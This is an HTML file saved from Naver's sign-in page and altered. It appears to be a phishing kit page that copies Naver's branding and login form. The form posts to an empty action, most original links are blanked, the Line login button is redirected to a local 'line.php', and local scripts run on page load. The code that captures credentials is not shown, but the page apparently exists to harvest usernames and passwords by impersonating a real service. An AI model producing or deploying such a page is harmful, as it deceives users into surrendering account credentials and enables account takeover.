<!DOCTYPE html>
<!-- saved from url=(0078)https://nid.naver.com/nidlogin.login?mode=form&url=https%3A%2F%2Fwww.naver.com -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<title>Naver Sign in</title>
	<link rel="stylesheet" type="text/css" href="./files/w_20191231.css">
</head>
<body class="global chrome" onload="alertMe()">
<div id="wrap">
	<div id="header">
		<h1><a href="http://www.naver.com/" class="sp h_logo" onclick="nclks(&#39;log.naver&#39;,this,event)"><span class="blind">NAVER</span></a></h1>
	</div>
	<!-- //header -->
	<!-- container -->
	<div id="container">
		<!-- content -->
		<div id="content">
			<div class="title" aria-live="assertive">
				<p></p>
			</div>
				<form id="frmNIDLogin" name="frmNIDLogin" target="_top" autocomplete="off" action="" method="POST" onsubmit="return confirmSplitSubmit();">

				<fieldset class="login_form">
					<legend class="blind">Sign in</legend>
					<div class="id_area">
						<div class="input_row" id="id_area">
							<span class="input_box">
								<label for="id" id="label_id_area" class="lbl" style="display: block;">Username</label>
								<input type="text" id="email" name="id" accesskey="L" placeholder="Username" class="int" maxlength="41" value="">
							</span>
						</div>
						<div class="error" id="error" aria-live="assertive"></div>
					</div>
					<div class="pw_area">
						<div class="input_row" id="pw_area">
							<span class="input_box">
								<label for="pw" id="label_pw_area" class="lbl">Password</label>
								<input type="password" id="password" name="pw" placeholder="Password" class="int" maxlength="16" onkeypress="capslockevt(event);getKeysv2();" onkeyup="checkShiftUp(event);" onkeydown="checkShiftDown(event);">
							</span>
						</div>
						<div class="error" id="error" aria-live="assertive"></div>
						<div class="success" id="processing" aria-live="assertive"></div>
					</div>

					<input type="submit" title="Sign in" alt="Sign in" id="login" value="Sign in" class="btn_global">
					<div class="check_info">
						<div class="login_check">
							<span class="login_check_box">
								<input type="checkbox" id="login_chk" name="nvlong" class="" value="off">
								<label for="login_chk" id="label_login_chk" class="sp ">Stay Signed in</label>
							</span>
							<div class="ly_v2" id="persist_usage" style="display:none;">
								<div class="ly_box">
									<p>Please use your own PC for keeping your account secure. &nbsp;&nbsp;<a href="" target="_blank" class="sp btn_check_help">View help</a></p>
								</div>
								<span class="sp ly_point"></span>
							</div>
						</div>
					</div>
				</fieldset>
			</form>
			<div class="position_a">
				<div class="find_info">
					<p>Forgot your <a target="_blank" id="idinquiry" href="">Username</a> or <a target="_blank" id="pwinquiry" href="">Password?</a> <span class="bar">|</span> <a target="_blank" id="join" href="">Sign up</a>
				</p></div>
			</div>

			<div class="social_login">
				<div class="social_header">
					<span class="social_title">Sign in &amp; Join with</span>
				</div>
				<div class="btn_social_group">
					<span class="btn_social_align" style="width: 100%;"><a href="line.php" class="btn_social line" title="Log in with your Line account"><span class="social_ico sp"></span><span class="social_text">Line</span></a></span>
				</div>
			</div>
		</div>
		<!-- //content -->
	</div>
	<!-- //container -->
	<!-- footer -->
	<div id="footer">
		<address><em><a target="_blank" href="" class="logo" onclick=""><span class="blind">naver</span></a></em><em class="copy">Copyright</em> <em class="u_cri">©</em> <a target="_blank" href="" class="u_cra" onclick="">NAVER Corp.</a> <span class="all_r">All Rights Reserved.</span></address>	
	</div>
	<!-- //footer -->
</div>
<script type="text/javascript" src="script.js"></script>
</body></html>